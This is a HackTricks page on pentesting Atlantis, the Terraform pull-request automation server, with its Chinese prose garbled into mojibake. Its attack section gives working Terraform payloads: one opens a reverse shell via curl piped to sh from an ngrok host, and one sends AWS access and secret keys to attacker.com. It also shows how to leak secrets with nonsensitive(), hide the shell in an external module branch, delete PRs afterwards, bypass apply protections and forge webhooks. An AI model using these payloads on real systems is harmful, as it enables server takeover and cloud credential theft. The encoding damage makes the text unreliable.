# Atlantiså®‰å…¨

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

AtlantisåŸºæœ¬ä¸Šå¸®åŠ©æ‚¨ä»gitæœåŠ¡å™¨çš„æ‹‰å–è¯·æ±‚ä¸­è¿è¡Œterraformã€‚

![](<../.gitbook/assets/image (161).png>)

## æœ¬åœ°å®éªŒå®¤

1. å‰å¾€[https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases)çš„**atlantiså‘å¸ƒé¡µé¢**ï¼Œå¹¶**ä¸‹è½½**é€‚åˆæ‚¨çš„ç‰ˆæœ¬ã€‚
2. åˆ›å»ºæ‚¨çš„**github**ç”¨æˆ·çš„**ä¸ªäººä»¤ç‰Œ**ï¼ˆå…·æœ‰å­˜å‚¨åº“è®¿é—®æƒé™ï¼‰
3. æ‰§è¡Œ`./atlantis testdrive`ï¼Œå®ƒå°†åˆ›å»ºä¸€ä¸ªæ‚¨å¯ä»¥ç”¨æ¥**ä¸atlantisäº¤äº’**çš„**æ¼”ç¤ºå­˜å‚¨åº“**
1. æ‚¨å¯ä»¥åœ¨127.0.0.1:4141è®¿é—®ç½‘é¡µ

## Atlantisè®¿é—®

### GitæœåŠ¡å™¨å‡­æ®

**Atlantis**æ”¯æŒå¤šä¸ªgitä¸»æœºï¼Œå¦‚**Github**ã€**Gitlab**ã€**Bitbucket**å’Œ**Azure DevOps**ã€‚\
ä½†æ˜¯ï¼Œä¸ºäº†è®¿é—®è¿™äº›å¹³å°ä¸Šçš„å­˜å‚¨åº“å¹¶æ‰§è¡Œæ“ä½œï¼Œéœ€è¦ä¸ºå®ƒä»¬æˆäºˆä¸€äº›**ç‰¹æƒè®¿é—®æƒé™**ï¼ˆè‡³å°‘å†™å…¥æƒé™ï¼‰ã€‚\
[**æ–‡æ¡£**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional)é¼“åŠ±åœ¨è¿™äº›å¹³å°ä¸Šåˆ›å»ºä¸€ä¸ªä¸“é—¨ç”¨äºAtlantisçš„ç”¨æˆ·ï¼Œä½†æœ‰äº›äººå¯èƒ½ä½¿ç”¨ä¸ªäººå¸æˆ·ã€‚

{% hint style="warning" %}
æ— è®ºå¦‚ä½•ï¼Œä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œ**Atlantiså¸æˆ·**å°†æ˜¯ä¸€ä¸ªéå¸¸**æœ‰è¶£**çš„**è¢«å…¥ä¾µ**ç›®æ ‡ã€‚
{% endhint %}

### Webhooks

Atlantiså¯é€‰æ‹©ä½¿ç”¨[**Webhookå¯†é’¥**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret)æ¥éªŒè¯å…¶ä»æ‚¨çš„Gitä¸»æœºæ¥æ”¶çš„**webhooks**æ˜¯å¦**åˆæ³•**ã€‚

ç¡®è®¤è¿™ä¸€ç‚¹çš„ä¸€ç§æ–¹æ³•æ˜¯**ä»…å…è®¸æ¥è‡ªæ‚¨çš„Gitä¸»æœºIPçš„è¯·æ±‚**ï¼Œä½†æ›´ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨Webhookå¯†é’¥ã€‚

è¯·æ³¨æ„ï¼Œé™¤éæ‚¨ä½¿ç”¨ç§æœ‰githubæˆ–bitbucketæœåŠ¡å™¨ï¼Œå¦åˆ™æ‚¨å°†éœ€è¦å°†webhookç«¯ç‚¹æš´éœ²åˆ°äº’è”ç½‘ä¸Šã€‚

{% hint style="warning" %}
Atlantiså°†**å…¬å¼€webhooks**ï¼Œä»¥ä¾¿gitæœåŠ¡å™¨å¯ä»¥å‘å…¶å‘é€ä¿¡æ¯ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œäº†è§£**æ˜¯å¦å¯ä»¥å‘é€æ¶ˆæ¯**å°†æ˜¯å¾ˆæœ‰è¶£çš„ã€‚
{% endhint %}

### æä¾›å•†å‡­æ® <a href="#provider-credentials" id="provider-credentials"></a>

[æ¥è‡ªæ–‡æ¡£ï¼š](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantisé€šè¿‡ç®€å•åœ°åœ¨æ‰˜ç®¡Atlantisçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œ`terraform plan`å’Œ`apply`å‘½ä»¤æ¥è¿è¡ŒTerraformã€‚å°±åƒåœ¨æœ¬åœ°è¿è¡ŒTerraformæ—¶ä¸€æ ·ï¼ŒAtlantiséœ€è¦æ‚¨ç‰¹å®šæä¾›å•†çš„å‡­æ®ã€‚

æ‚¨å¯ä»¥é€‰æ‹©å¦‚ä½•ä¸ºAtlantisæä¾›æ‚¨ç‰¹å®šæä¾›å•†çš„å‡­æ®ï¼š

- Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart)å’Œ[AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate)å…·æœ‰å„è‡ªçš„æä¾›å•†å‡­æ®æœºåˆ¶ã€‚è¯·é˜…è¯»å®ƒä»¬çš„æ–‡æ¡£ã€‚
- å¦‚æœæ‚¨åœ¨äº‘ä¸­è¿è¡ŒAtlantisï¼Œåˆ™è®¸å¤šäº‘éƒ½æœ‰æ–¹æ³•ä¸ºåœ¨å…¶ä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åºæä¾›äº‘APIè®¿é—®æƒé™ï¼Œä¾‹å¦‚ï¼š
  - [AWS EC2è§’è‰²](https://registry.terraform.io/providers/hashicorp/aws/latest/docs)ï¼ˆæœç´¢â€œEC2è§’è‰²â€ï¼‰
  - [GCEå®ä¾‹æœåŠ¡å¸æˆ·](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
- è®¸å¤šç”¨æˆ·è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚`AWS_ACCESS_KEY`ï¼Œå…¶ä¸­Atlantisæ­£åœ¨è¿è¡Œã€‚
- å…¶ä»–äººåˆ›å»ºå¿…è¦çš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚`~/.aws/credentials`ï¼Œå…¶ä¸­Atlantisæ­£åœ¨è¿è¡Œã€‚
- ä½¿ç”¨[HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs)è·å–æä¾›å•†å‡­æ®ã€‚

{% hint style="warning" %}
**Atlantis**è¿è¡Œçš„**å®¹å™¨**å¾ˆå¯èƒ½ä¼š**åŒ…å«**ç®¡ç†è€…ï¼ˆAWSã€GCPã€Githubç­‰ï¼‰çš„**ç‰¹æƒå‡­æ®**ã€‚
{% endhint %}

### ç½‘é¡µ

é»˜è®¤æƒ…å†µä¸‹ï¼ŒAtlantiså°†åœ¨æœ¬åœ°ç«¯å£4141ä¸Šè¿è¡Œä¸€ä¸ª**ç½‘é¡µ**ã€‚æ­¤é¡µé¢åªå…è®¸æ‚¨å¯ç”¨/ç¦ç”¨atlantisåº”ç”¨ç¨‹åºå¹¶æ£€æŸ¥å­˜å‚¨åº“çš„è®¡åˆ’çŠ¶æ€å¹¶è§£é”å®ƒä»¬ï¼ˆå®ƒä¸å…è®¸ä¿®æ”¹å†…å®¹ï¼Œå› æ­¤å¹¶ä¸é‚£ä¹ˆæœ‰ç”¨ï¼‰ã€‚

æ‚¨å¯èƒ½ä¸ä¼šå‘ç°å®ƒæš´éœ²åœ¨äº’è”ç½‘ä¸Šï¼Œä½†é»˜è®¤æƒ…å†µä¸‹ä¼¼ä¹**ä¸éœ€è¦å‡­æ®**è®¿é—®å®ƒï¼ˆå¦‚æœéœ€è¦ï¼Œ`atlantis`:`atlantis`æ˜¯**é»˜è®¤**å‡­æ®ï¼‰ã€‚

## æœåŠ¡å™¨é…ç½®

å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ ‡å¿—ã€ç¯å¢ƒå˜é‡ã€é…ç½®æ–‡ä»¶æˆ–ä¸‰è€…æ··åˆæ¥æŒ‡å®šå¯¹`atlantis server`çš„é…ç½®ã€‚

- æ‚¨å¯ä»¥åœ¨[**è¿™é‡Œæ‰¾åˆ°æ”¯æŒçš„æ ‡å¿—åˆ—è¡¨**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)ç”±AtlantisæœåŠ¡å™¨æ”¯æŒ
- æ‚¨å¯ä»¥åœ¨[**è¿™é‡Œæ‰¾åˆ°å¦‚ä½•å°†é…ç½®é€‰é¡¹è½¬æ¢ä¸ºç¯å¢ƒå˜é‡**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

å€¼æŒ‰ç…§ä»¥ä¸‹é¡ºåº**é€‰æ‹©**ï¼š

1. æ ‡å¿—
2. ç¯å¢ƒå˜é‡
3. é…ç½®æ–‡ä»¶

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œåœ¨é…ç½®ä¸­å¯èƒ½ä¼šæ‰¾åˆ°æœ‰è¶£çš„å€¼ï¼Œå¦‚**ä»¤ç‰Œå’Œå¯†ç **ã€‚
{% endhint %}

### å­˜å‚¨åº“é…ç½®

ä¸€äº›é…ç½®ä¼šå½±å“**å­˜å‚¨åº“çš„ç®¡ç†æ–¹å¼**ã€‚ä½†æ˜¯ï¼Œå¯èƒ½**æ¯ä¸ªå­˜å‚¨åº“éœ€è¦ä¸åŒçš„è®¾ç½®**ï¼Œå› æ­¤æœ‰æ–¹æ³•æŒ‡å®šæ¯ä¸ªå­˜å‚¨åº“ã€‚è¿™æ˜¯ä¼˜å…ˆçº§é¡ºåºï¼š

1. å­˜å‚¨åº“[**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config)æ–‡ä»¶ã€‚æ­¤æ–‡ä»¶å¯ç”¨äºæŒ‡å®šatlantisåº”å¦‚ä½•å¤„ç†å­˜å‚¨åº“ã€‚ä½†æ˜¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€äº›é”®ä¸èƒ½åœ¨æ­¤å¤„æŒ‡å®šï¼Œé™¤éå…è®¸ä¸€äº›æ ‡å¿—ã€‚
1. å¯èƒ½éœ€è¦é€šè¿‡åƒ`allowed_overrides`æˆ–`allow_custom_workflows`è¿™æ ·çš„æ ‡å¿—æ¥å…è®¸
2. [**æœåŠ¡å™¨ç«¯é…ç½®**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config)ï¼šæ‚¨å¯ä»¥ä½¿ç”¨`--repo-config`æ ‡å¿—ä¼ é€’å®ƒï¼Œè¿™æ˜¯ä¸€ä¸ªä¸ºæ¯ä¸ªå­˜å‚¨åº“é…ç½®æ–°è®¾ç½®çš„yamlï¼ˆæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ï¼‰
3. **é»˜è®¤**å€¼
#### PR Protections

Atlantiså…è®¸æŒ‡å®šæ˜¯å¦å¸Œæœ›**PR**åœ¨è¿è¡Œåº”ç”¨ä¹‹å‰è¢«å…¶ä»–äºº**`æ‰¹å‡†`**ï¼ˆå³ä½¿åœ¨åˆ†æ”¯ä¿æŠ¤ä¸­æ²¡æœ‰è®¾ç½®ï¼‰ï¼Œå’Œ/æˆ–è€…åœ¨**`å¯åˆå¹¶`**ï¼ˆåˆ†æ”¯ä¿æŠ¤é€šè¿‡ï¼‰**ä¹‹å‰è¿è¡Œ**ã€‚ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œå»ºè®®è®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹ã€‚

å¦‚æœ`allowed_overrides`ä¸ºTrueï¼Œåˆ™å¯ä»¥é€šè¿‡**`/atlantis.yml`æ–‡ä»¶**åœ¨æ¯ä¸ªé¡¹ç›®ä¸Šè¦†ç›–è¿™äº›è®¾ç½®ã€‚

#### Scripts

å­˜å‚¨åº“é…ç½®å¯ä»¥**æŒ‡å®šè„šæœ¬**åœ¨[**ä¹‹å‰**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage)ï¼ˆ_é¢„å·¥ä½œæµæŒ‚é’©_ï¼‰å’Œ[**ä¹‹å**](https://www.runatlantis.io/docs/post-workflow-hooks.html)ï¼ˆ_åå·¥ä½œæµæŒ‚é’©_ï¼‰**æ‰§è¡Œå·¥ä½œæµç¨‹**ã€‚

åœ¨**å­˜å‚¨åº“`/atlantis.yml`**æ–‡ä»¶ä¸­æ²¡æœ‰é€‰é¡¹å…è®¸**æŒ‡å®š**è¿™äº›è„šæœ¬ã€‚

#### Workflow

åœ¨å­˜å‚¨åº“é…ç½®ï¼ˆæœåŠ¡å™¨ç«¯é…ç½®ï¼‰ä¸­ï¼Œæ‚¨å¯ä»¥[**æŒ‡å®šæ–°çš„é»˜è®¤å·¥ä½œæµç¨‹**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow)ï¼Œæˆ–è€…[**åˆ›å»ºæ–°çš„è‡ªå®šä¹‰å·¥ä½œæµç¨‹**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**ã€‚** æ‚¨è¿˜å¯ä»¥**æŒ‡å®š**å“ªäº›**å­˜å‚¨åº“**å¯ä»¥**è®¿é—®**ç”Ÿæˆçš„**æ–°å·¥ä½œæµç¨‹**ã€‚\
ç„¶åï¼Œæ‚¨å¯ä»¥å…è®¸æ¯ä¸ªå­˜å‚¨åº“çš„**atlantis.yaml**æ–‡ä»¶**æŒ‡å®šè¦ä½¿ç”¨çš„å·¥ä½œæµç¨‹**ã€‚

{% hint style="danger" %}
å¦‚æœ[**æœåŠ¡å™¨ç«¯é…ç½®**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config)æ ‡å¿—`allow_custom_workflows`è®¾ç½®ä¸º**True**ï¼Œåˆ™å¯ä»¥åœ¨æ¯ä¸ªå­˜å‚¨åº“çš„**`atlantis.yaml`**æ–‡ä»¶ä¸­**æŒ‡å®šå·¥ä½œæµç¨‹**ã€‚è¿˜å¯èƒ½éœ€è¦**`allowed_overrides`**ä¹ŸæŒ‡å®š**`workflow`**æ¥**è¦†ç›–å°†è¦ä½¿ç”¨çš„å·¥ä½œæµç¨‹**ã€‚\
è¿™åŸºæœ¬ä¸Šä¼šç»™**å¯ä»¥è®¿é—®è¯¥å­˜å‚¨åº“çš„ä»»ä½•ç”¨æˆ·åœ¨AtlantisæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç çš„æƒé™**ã€‚
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftestç­–ç•¥æ£€æŸ¥

Atlantisæ”¯æŒé’ˆå¯¹è®¡åˆ’è¾“å‡ºè¿è¡Œ**æœåŠ¡å™¨ç«¯**[**conftest**](https://www.conftest.dev/) **ç­–ç•¥**ã€‚ä½¿ç”¨æ­¤æ­¥éª¤çš„å¸¸è§ç”¨ä¾‹åŒ…æ‹¬ï¼š

- æ‹’ç»ä½¿ç”¨æ¨¡å—åˆ—è¡¨
- åœ¨åˆ›å»ºæ—¶æ–­è¨€èµ„æºçš„å±æ€§
- æ•è·æ„å¤–èµ„æºåˆ é™¤
- é˜²æ­¢å®‰å…¨é£é™©ï¼ˆä¾‹å¦‚å°†å®‰å…¨ç«¯å£æš´éœ²ç»™å…¬ä¼—ï¼‰

æ‚¨å¯ä»¥æŸ¥çœ‹å¦‚ä½•é…ç½®å®ƒåœ¨[**æ–‡æ¡£**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works)ä¸­ã€‚

## Atlantiså‘½ä»¤

åœ¨[**æ–‡æ¡£**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis)ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å¯ä»¥ç”¨æ¥è¿è¡ŒAtlantisçš„é€‰é¡¹ã€‚
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## æ”»å‡»

{% hint style="warning" %}
å¦‚æœåœ¨åˆ©ç”¨è¿‡ç¨‹ä¸­é‡åˆ°æ­¤**é”™è¯¯**ï¼š`Error: Error acquiring the state lock`

æ‚¨å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥ä¿®å¤ï¼š
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantisè®¡åˆ’RCE - åœ¨æ–°PRä¸­ä¿®æ”¹é…ç½®

å¦‚æœæ‚¨å¯¹å­˜å‚¨åº“å…·æœ‰å†™å…¥è®¿é—®æƒé™ï¼Œæ‚¨å°†èƒ½å¤Ÿåœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯å¹¶ç”Ÿæˆä¸€ä¸ªPRã€‚å¦‚æœæ‚¨å¯ä»¥**æ‰§è¡Œ`atlantis plan`**ï¼ˆæˆ–è€…å®ƒå¯èƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œï¼‰ï¼Œ**æ‚¨å°†èƒ½å¤Ÿåœ¨AtlantisæœåŠ¡å™¨å†…æ‰§è¡ŒRCE**ã€‚

æ‚¨å¯ä»¥é€šè¿‡è®©[**AtlantisåŠ è½½å¤–éƒ¨æ•°æ®æº**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source)æ¥å®ç°è¿™ä¸€ç‚¹ã€‚åªéœ€åœ¨`main.tf`æ–‡ä»¶ä¸­æ”¾å…¥å¦‚ä¸‹æœ‰æ•ˆè´Ÿè½½ï¼š
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### æ›´éšè”½çš„æ”»å‡»

æ‚¨ç”šè‡³å¯ä»¥ä»¥æ›´éšè”½çš„æ–¹å¼æ‰§è¡Œæ­¤æ”»å‡»ï¼ŒæŒ‰ç…§ä»¥ä¸‹å»ºè®®æ“ä½œï¼š

* è€Œä¸æ˜¯ç›´æ¥å°†åå‘ shell æ·»åŠ åˆ° terraform æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥**åŠ è½½åŒ…å«åå‘ shell çš„å¤–éƒ¨èµ„æº**ï¼š
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
ä½ å¯ä»¥åœ¨[https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)æ‰¾åˆ°åå‘shellä»£ç ã€‚

* åœ¨å¤–éƒ¨èµ„æºä¸­ï¼Œä½¿ç”¨**ref**åŠŸèƒ½å°†**terraformåå‘shellä»£ç éšè—åœ¨å­˜å‚¨åº“çš„ä¸€ä¸ªåˆ†æ”¯**ä¸­ï¼Œç±»ä¼¼äºï¼š`git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **è€Œä¸æ˜¯**åˆ›å»ºä¸€ä¸ª**PRåˆ°ä¸»åˆ†æ”¯**æ¥è§¦å‘Atlantisï¼Œ**åˆ›å»º2ä¸ªåˆ†æ”¯**ï¼ˆtest1å’Œtest2ï¼‰ï¼Œå¹¶ä»ä¸€ä¸ªåˆ†æ”¯åˆ›å»ºä¸€ä¸ª**PRåˆ°å¦ä¸€ä¸ªåˆ†æ”¯**ã€‚å½“æ”»å‡»å®Œæˆåï¼Œåªéœ€**åˆ é™¤PRå’Œåˆ†æ”¯**ã€‚

### Atlantisè®¡åˆ’æœºå¯†ä¿¡æ¯æ³„éœ²

ä½ å¯ä»¥é€šè¿‡åœ¨terraformæ–‡ä»¶ä¸­æ”¾ç½®ç±»ä¼¼ä»¥ä¸‹å†…å®¹æ¥è¿è¡Œ`atlantis plan`ï¼ˆ`terraform plan`ï¼‰æ¥**æ³„éœ²terraformä½¿ç”¨çš„æœºå¯†ä¿¡æ¯**ï¼š
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantisåº”ç”¨RCE - åœ¨æ–°PRä¸­ä¿®æ”¹é…ç½®

å¦‚æœæ‚¨å¯¹å­˜å‚¨åº“å…·æœ‰å†™å…¥è®¿é—®æƒé™ï¼Œåˆ™å¯ä»¥åœ¨å…¶ä¸Šåˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯å¹¶ç”ŸæˆPRã€‚å¦‚æœæ‚¨å¯ä»¥æ‰§è¡Œ`atlantis apply`ï¼Œåˆ™å¯ä»¥åœ¨AtlantisæœåŠ¡å™¨å†…éƒ¨æ‰§è¡ŒRCEã€‚

ä½†æ˜¯ï¼Œé€šå¸¸éœ€è¦ç»•è¿‡ä¸€äº›ä¿æŠ¤æªæ–½ï¼š

- **å¯åˆå¹¶æ€§**ï¼šå¦‚æœåœ¨Atlantisä¸­è®¾ç½®äº†æ­¤ä¿æŠ¤ï¼Œåªæœ‰åœ¨PRå¯åˆå¹¶æ—¶æ‰èƒ½è¿è¡Œ`atlantis apply`ï¼ˆè¿™æ„å‘³ç€éœ€è¦ç»•è¿‡åˆ†æ”¯ä¿æŠ¤ï¼‰ã€‚
- æ£€æŸ¥å¯èƒ½çš„[**åˆ†æ”¯ä¿æŠ¤ç»•è¿‡**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
- **å·²æ‰¹å‡†**ï¼šå¦‚æœåœ¨Atlantisä¸­è®¾ç½®äº†æ­¤ä¿æŠ¤ï¼Œ**å…¶ä»–ç”¨æˆ·å¿…é¡»åœ¨æ‚¨è¿è¡Œ`atlantis apply`ä¹‹å‰æ‰¹å‡†PR**ã€‚
- é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨[**Gitbotä»¤ç‰Œæ¥ç»•è¿‡æ­¤ä¿æŠ¤**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

åœ¨æ¶æ„Terraformæ–‡ä»¶ä¸Šè¿è¡Œ**`terraform apply`ï¼Œä½¿ç”¨** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**ã€‚**\
æ‚¨åªéœ€è¦ç¡®ä¿ç±»ä¼¼ä»¥ä¸‹è´Ÿè½½çš„å†…å®¹å‡ºç°åœ¨`main.tf`æ–‡ä»¶ä¸­ï¼š
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
### Terraformå‚æ•°æ³¨å…¥

åœ¨è¿è¡Œ`atlantis plan`æˆ–`atlantis apply`æ—¶ï¼Œterraformä¼šåœ¨åå°è¿è¡Œï¼Œæ‚¨å¯ä»¥é€šè¿‡åœ¨atlantisä¸­æ³¨é‡Šç±»ä¼¼ä»¥ä¸‹å†…å®¹æ¥å‘terraformä¼ é€’å‘½ä»¤ï¼š
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
### è‡ªå®šä¹‰å·¥ä½œæµç¨‹

è¿è¡Œåœ¨ `atlantis.yaml` æ–‡ä»¶ä¸­æŒ‡å®šçš„**æ¶æ„è‡ªå®šä¹‰æ„å»ºå‘½ä»¤**ã€‚ Atlantis ä½¿ç”¨æ¥è‡ªæ‹‰å–è¯·æ±‚åˆ†æ”¯çš„ `atlantis.yaml` æ–‡ä»¶ï¼Œ**è€Œä¸æ˜¯**æ¥è‡ª `master` åˆ†æ”¯ã€‚\
è¿™ç§å¯èƒ½æ€§åœ¨å‰é¢çš„éƒ¨åˆ†ä¸­æåˆ°è¿‡ï¼š

{% hint style="danger" %}
å¦‚æœ [**æœåŠ¡å™¨ç«¯é…ç½®**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) æ ‡å¿— `allow_custom_workflows` è¢«è®¾ç½®ä¸º **True**ï¼Œå·¥ä½œæµç¨‹å¯ä»¥åœ¨æ¯ä¸ªå­˜å‚¨åº“çš„ **`atlantis.yaml`** æ–‡ä»¶ä¸­**æŒ‡å®š**ã€‚è¿˜å¯èƒ½éœ€è¦ **`allowed_overrides`** ä¹ŸæŒ‡å®š **`workflow`** æ¥**è¦†ç›–å°†è¦ä½¿ç”¨çš„å·¥ä½œæµç¨‹**ã€‚

è¿™åŸºæœ¬ä¸Šä¼šç»™**å¯ä»¥è®¿é—®è¯¥å­˜å‚¨åº“çš„ä»»ä½•ç”¨æˆ·åœ¨ Atlantis æœåŠ¡å™¨ä¸­æ‰§è¡Œè¿œç¨‹ä»£ç çš„æƒé™**ã€‚
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### ç»•è¿‡è®¡åˆ’/åº”ç”¨ä¿æŠ¤

å¦‚æœ[**æœåŠ¡å™¨ç«¯é…ç½®**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config)æ ‡å¿—`allowed_overrides` _å·²_é…ç½®`apply_requirements`ï¼Œåˆ™å¯èƒ½å…è®¸å­˜å‚¨åº“**ä¿®æ”¹è®¡åˆ’/åº”ç”¨ä¿æŠ¤ä»¥ç»•è¿‡å®ƒä»¬**ã€‚
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PRåŠ«æŒ

å¦‚æœæœ‰äººåœ¨æ‚¨çš„æœ‰æ•ˆæ‹‰å–è¯·æ±‚ä¸Šå‘é€`atlantis plan/apply`è¯„è®ºï¼Œå°†å¯¼è‡´terraformåœ¨æ‚¨ä¸å¸Œæœ›è¿è¡Œæ—¶è¿è¡Œã€‚

æ­¤å¤–ï¼Œå¦‚æœæ‚¨æ²¡æœ‰åœ¨**åˆ†æ”¯ä¿æŠ¤**ä¸­é…ç½®ä¸ºåœ¨**æ¨é€æ–°æäº¤**æ—¶è¦æ±‚**é‡æ–°è¯„ä¼°**æ¯ä¸ªPRï¼ŒæŸäººå¯ä»¥åœ¨terraformé…ç½®ä¸­**ç¼–å†™æ¶æ„é…ç½®**ï¼ˆæ£€æŸ¥å…ˆå‰çš„æƒ…æ™¯ï¼‰ï¼Œè¿è¡Œ`atlantis plan/apply`å¹¶è·å¾—RCEã€‚

è¿™æ˜¯Githubåˆ†æ”¯ä¿æŠ¤ä¸­çš„**è®¾ç½®**ï¼š

![](<../.gitbook/assets/image (216).png>)

### Webhookå¯†é’¥

å¦‚æœæ‚¨æˆåŠŸ**çªƒå–äº†ä½¿ç”¨çš„Webhookå¯†é’¥**ï¼Œæˆ–è€…**æ²¡æœ‰ä½¿ç”¨ä»»ä½•Webhookå¯†é’¥**ï¼Œæ‚¨å¯ä»¥**è°ƒç”¨Atlantis Webhook**å¹¶ç›´æ¥**è°ƒç”¨atlantiså‘½ä»¤**ã€‚

### Bitbucket

Bitbucket Cloud**ä¸æ”¯æŒWebhookå¯†é’¥**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…**ä¼ªé€ æ¥è‡ªBitbucketçš„è¯·æ±‚**ã€‚ç¡®ä¿åªå…è®¸Bitbucket IPã€‚

- è¿™æ„å‘³ç€**æ”»å‡»è€…**å¯ä»¥åˆ¶ä½œçœ‹èµ·æ¥æ¥è‡ªBitbucketçš„**è™šå‡è¯·æ±‚**å‘é€ç»™Atlantisã€‚
